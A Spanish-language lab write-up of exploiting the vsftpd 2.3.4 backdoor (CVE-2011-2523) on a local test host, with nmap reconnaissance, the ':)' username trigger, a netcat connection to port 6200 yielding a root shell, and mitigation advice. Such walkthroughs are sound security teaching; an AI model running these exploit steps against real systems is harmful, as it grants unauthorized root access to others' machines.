# Tproot
# 🔐 Laboratorio: vsftpd 2.3.4 Backdoor (CVE-2011-2523)

> ⚠️ **Aviso:** Este documento describe una explotación realizada en un entorno de laboratorio controlado. No debe utilizarse contra sistemas sin autorización expresa.

---

## 🔍 1. Reconocimiento

Comenzamos realizando un escaneo de puertos completo utilizando `nmap` para identificar los servicios expuestos.

```bash
sudo nmap -p- -sS -sC -sV -T5 -n -Pn -vvv 172.17.0.2
```

### Resultados del escaneo

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 21/tcp | Abierto | FTP | vsftpd 2.3.4 |
| 80/tcp | Abierto | HTTP | Apache httpd 2.4.58 (Ubuntu) |

El puerto 80 solo expone la página por defecto de Apache, sin contenido adicional relevante. Por ello, el foco del análisis se centra inmediatamente en el puerto **21**.

---

## 📂 2. Enumeración

### Enumeración FTP (Puerto 21)

La versión `vsftpd 2.3.4` identificada corresponde a una release severamente comprometida. Entre el 30 de junio y el 3 de julio de 2011, un atacante sustituyó el archivo oficial por una versión modificada que incluía una puerta trasera (**CVE-2011-2523**, **CWE-78**).

**Funcionamiento del backdoor:** se activa al enviar un nombre de usuario que contenga la secuencia de caracteres `:)` (un "smiley"). Al detectarlo, el proceso abre un listener en el puerto `6200/tcp` que entrega una shell de comandos con privilegios de `root`, sin requerir autenticación válida ni exploits adicionales.

Aunque existen módulos públicos en Metasploit (`exploit/unix/ftp/vsftpd_234_backdoor`) o en Exploit-DB, optamos por la explotación manual para comprender el funcionamiento interno de la vulnerabilidad.

---

## 🔓 3. Acceso Inicial

Nos conectamos al servicio FTP utilizando el cliente estándar del sistema. El servidor responde con su banner, confirmando la versión vulnerable.

```bash
ftp 172.17.0.2
```

```text
Connected to 172.17.0.2.
220 (vsFTPd 2.3.4)
Name (172.17.0.2:kali): user:)
331 Please specify the password.
Password:
```

Al introducir como nombre de usuario `user:)`, el proceso `vsftpd` detecta la secuencia e inicia en segundo plano el listener en el puerto `6200`.

En otra terminal, nos conectamos con `netcat` al puerto recién abierto:

```bash
nc 172.17.0.2 6200
```

```text
whoami
# root
```

---

## ⚙️ 4. Escalada de Privilegios

La escalada de privilegios no es necesaria en esta máquina. El backdoor de `vsftpd 2.3.4` entrega directamente una shell con privilegios de administrador, ya que el propio proceso del servicio se ejecuta como `root` y el comando lanzado por la puerta trasera hereda dicho contexto.

---

## 🛡️ 5. Mitigación y Lecciones Aprendidas

Para asegurar este tipo de entornos y evitar ataques similares, se recomiendan las siguientes prácticas:

- **Gestión de versiones y parches:** actualizar inmediatamente a una versión no comprometida de `vsftpd`. Mantener un inventario estricto del software expuesto para detectar versiones obsoletas rápidamente.
- **Verificación de integridad:** descargar binarios exclusivamente de fuentes oficiales y verificar siempre sus hashes o firmas criptográficas antes de instalarlos o desplegarlos en producción.
- **Principio de menor privilegio:** evitar ejecutar servicios orientados a red (como FTP) con privilegios de `root`. Configurar el servicio para que opere bajo un usuario con privilegios restringidos y en un entorno enjaulado (`chroot`).
- **Exposición de servicios:** no exponer protocolos en texto plano como FTP a redes no confiables o a internet público. Transicionar a alternativas seguras como **SFTP**.
